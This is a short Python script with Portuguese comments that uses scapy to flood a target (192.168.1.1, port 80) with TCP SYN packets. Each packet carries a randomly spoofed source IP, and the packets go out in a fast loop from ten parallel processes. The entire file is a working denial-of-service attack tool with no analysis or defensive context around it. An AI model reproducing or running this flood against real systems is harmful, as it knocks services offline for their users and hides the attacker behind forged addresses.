from scapy.all import *
#import threading
def flood():
        # Define o endereço IP de origem e destino
        src_ip = RandIP()
        dst_ip = '192.168.1.1'

        # Define o número de porta de origem e destino
        src_port = 1234
        dst_port = 80

        dado = b"ola tudo bem"
        # Cria um pacote TCP SYN
        tcp_packet = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="S")/Raw(load=dado)

        # Envia o pacote
        limit = 0
        #while limit < 1050:
            #print(len(tcp_packet[TCP].payload))
        send(tcp_packet, loop=10000, verbose=1, inter=0.0001)

if __name__ == '__main__':
    # Define o número de processos
    num_processes = 10

    # Cria uma lista de processos
    processes = [multiprocessing.Process(target=flood) for _ in range(num_processes)]

    # Inicia todos os processos
    for process in processes:
        process.start()
